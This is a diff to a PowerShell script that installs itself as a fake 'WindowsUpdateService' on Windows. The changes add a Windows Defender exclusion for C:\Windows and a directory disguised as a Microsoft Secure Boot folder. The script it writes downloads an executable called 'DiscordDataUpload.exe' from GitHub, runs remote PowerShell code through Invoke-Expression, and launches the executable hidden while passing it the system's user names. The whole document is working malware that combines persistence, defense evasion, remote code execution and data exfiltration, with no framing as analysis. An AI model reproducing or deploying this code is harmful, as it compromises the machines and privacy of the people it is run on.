@@ -10,6 +10,22 @@ if (-not $isAdmin) {
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
+$directoryPath = "C:/Windows/System32/SecureBootUpdatesMicrosoft/"
+
+#Ading defender exclusion.
+try {
+  $exclusionPath = "C:\Windows"
+  Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue -ErrorVariable AddExclusionError | Out-Null
+  if (-not $AddExclusionError) {
+  }
+}
+catch {}
+
+#Creating the directory
+if (-not (Test-Path -Path $directoryPath -PathType Container)) {
+  New-Item -Path $directoryPath -ItemType Directory
+} else {
+}
 
 # Check if the registry path exists, create it if not
 if (-not (Test-Path $regPath)) {
@@ -38,23 +54,21 @@ if (-not (Test-Path "$regPath\Data") -or (Get-ItemProperty -Path "$regPath\Data"
 
 #Install WindowsUpdateService
 $scriptContent = @'
-while ($true) {
-  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-  $accessurl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
-  $boturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
-  $accessresponse = Invoke-WebRequest -Uri $accessurl -UseBasicParsing -ErrorAction SilentlyContinue
-  $regPath = "HKLM:\Software\WindowsUpdateService"
-  $code = (Get-ItemProperty -Path $regPath).Code
-  $data = (Get-ItemProperty -Path $regPath).Data
-  $userNames = '(' + ((Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }) -join ', ') + ')'
-  $exepath = "C:/Windows/System32/DiscordDataUpload.exe"
-  $combineddata = """**{OfflineInitiatedSystems}** Scheduling successful on **$code**, w/status **$data**, System's Userset is **$userNames**."""
-  Invoke-WebRequest -Uri $boturl -OutFile $exepath -UseBasicParsing -ErrorAction SilentlyContinue
-  Invoke-Expression (Invoke-WebRequest -Uri $accessurl -UseBasicParsing).Content
-  Start-Process -WindowStyle Hidden -FilePath $exepath -ArgumentList $combineddata -ErrorAction SilentlyContinue
-  Start-Sleep -Seconds (3 * 60)
-}
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$accessurl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
+$boturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
+$accessresponse = Invoke-WebRequest -Uri $accessurl -UseBasicParsing -ErrorAction SilentlyContinue
+$regPath = "HKLM:\Software\WindowsUpdateService"
+$code = (Get-ItemProperty -Path $regPath).Code
+$data = (Get-ItemProperty -Path $regPath).Data
+$userNames = '(' + ((Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }) -join ', ') + ')'
+$exepath = "C:/Windows/System32/SecureBootUpdatesMicrosoft/DiscordDataUpload.exe"
+$combineddata = """**{Offline}** Scheduling successful on **$code**, w/status **$data**, System's Userset is **$userNames**."""
+Invoke-WebRequest -Uri $boturl -OutFile $exepath -UseBasicParsing -ErrorAction SilentlyContinue
+Invoke-Expression (Invoke-WebRequest -Uri $accessurl -UseBasicParsing).Content
+Start-Process -WindowStyle Hidden -FilePath $exepath -ArgumentList $combineddata -ErrorAction SilentlyContinue
 '@
+
 Remove-Item $shellscriptpath -Force -ErrorAction SilentlyContinue
 $scriptContent | Set-Content -Path $shellscriptpath -Force
 
